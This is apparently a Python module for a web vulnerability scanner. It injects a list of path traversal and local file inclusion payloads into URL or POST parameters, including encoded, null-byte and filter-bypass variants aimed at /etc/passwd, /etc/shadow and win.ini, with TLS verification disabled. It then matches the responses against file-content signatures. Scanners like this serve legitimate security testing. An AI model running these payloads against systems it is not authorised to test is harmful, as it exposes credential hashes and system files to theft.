"""
Path Traversal Scanner Module
Detects directory traversal and local file inclusion vulnerabilities
"""

import requests
import urllib.parse
from typing import List, Dict, Any
import logging

logger = logging.getLogger(__name__)


class PathTraversalScanner:
    """
    Path Traversal vulnerability scanner
    Tests for directory traversal and local file inclusion
    """
    
    # Path traversal payloads
    TRAVERSAL_PAYLOADS = [
        # Basic traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "../../../etc/shadow",
        "..\\..\\..\\boot.ini",
        
        # URL encoded
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%5c..%5c..%5cwindows%5cwin.ini",
        
        # Double URL encoded
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%255c..%255c..%255cwindows%255cwin.ini",
        
        # Unicode encoded
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini",
        
        # Absolute paths
        "/etc/passwd",
        "C:\\windows\\win.ini",
        "/etc/shadow",
        "/etc/group",
        "/etc/hosts",
        "C:\\boot.ini",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        
        # Null byte injection
        "../../../etc/passwd%00",
        "..\\..\\..\\windows\\win.ini%00",
        
        # Deep traversal
        "../../../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        
        # Filter bypass
        "....//....//....//etc/passwd",
        "....\\\\....\\\\....\\\\windows\\win.ini",
        "..;/..;/..;/etc/passwd",
    ]
    
    # File content signatures
    FILE_SIGNATURES = {
        '/etc/passwd': [
            r'root:.*:0:0:',
            r'daemon:',
            r'bin:',
            r'nobody:'
        ],
        '/etc/shadow': [
            r'root:\$',
            r':\$[0-9]\$',
        ],
        'win.ini': [
            r'\[fonts\]',
            r'\[extensions\]',
            r'for 16-bit app support'
        ],
        'boot.ini': [
            r'\[boot loader\]',
            r'timeout=',
            r'default='
        ]
    }
    
    def __init__(self, timeout: int = 10):
        """
        Initialize Path Traversal Scanner
        
        Args:
            timeout: Request timeout in seconds
        """
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def scan_url(self, url: str, params: Dict[str, str] = None, method: str = "GET") -> List[Dict[str, Any]]:
        """
        Scan URL for path traversal vulnerabilities
        
        Args:
            url: Target URL
            params: URL parameters or POST data
            method: HTTP method
            
        Returns:
            List of detected path traversal vulnerabilities
        """
        vulnerabilities = []
        
        if not params:
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        if not params:
            logger.warning(f"No parameters found for {url}")
            return vulnerabilities
        
        logger.info(f"Testing path traversal on {url} with {len(params)} parameters")
        
        # Test each parameter
        for param_name in params.keys():
            vulns = self._test_path_traversal(url, params, param_name, method)
            vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    def _test_path_traversal(self, url: str, params: Dict, param_name: str, method: str) -> List[Dict[str, Any]]:
        """Test parameter for path traversal"""
        vulnerabilities = []
        
        for payload in self.TRAVERSAL_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                if method.upper() == "POST":
                    response = self.session.post(url, data=test_params, timeout=self.timeout, verify=False)
                else:
                    response = self.session.get(url, params=test_params, timeout=self.timeout, verify=False)
                
                # Check for file content in response
                detected_file = self._detect_file_content(response.text)
                
                if detected_file:
                    vulnerabilities.append({
                        'type': 'Path Traversal / Local File Inclusion',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'method': method,
                        'evidence': f"Detected content from: {detected_file}",
                        'file_accessed': detected_file,
                        'status_code': response.status_code,
                        'response_snippet': response.text[:500]
                    })
                    logger.warning(f"✗ Path Traversal detected in {param_name} - accessed {detected_file}")
                    return vulnerabilities  # Found vulnerability
            
            except Exception as e:
                logger.debug(f"Error testing path traversal: {e}")
        
        return vulnerabilities
    
    def _detect_file_content(self, response_text: str) -> str:
        """
        Detect which sensitive file was accessed based on content
        
        Args:
            response_text: HTTP response body
            
        Returns:
            str: Name of detected file or empty string
        """
        import re
        
        for file_name, signatures in self.FILE_SIGNATURES.items():
            for signature in signatures:
                if re.search(signature, response_text, re.IGNORECASE):
                    return file_name
        
        return ""


# Example usage
if __name__ == "__main__":
    scanner = PathTraversalScanner()
    
    test_url = "https://example.com/view"
    test_params = {"file": "document.pdf"}
    
    vulnerabilities = scanner.scan_url(test_url, test_params)
    
    print(f"\nFound {len(vulnerabilities)} path traversal vulnerabilities:")
    for vuln in vulnerabilities:
        print(f"  - {vuln['type']} in parameter '{vuln['parameter']}'")
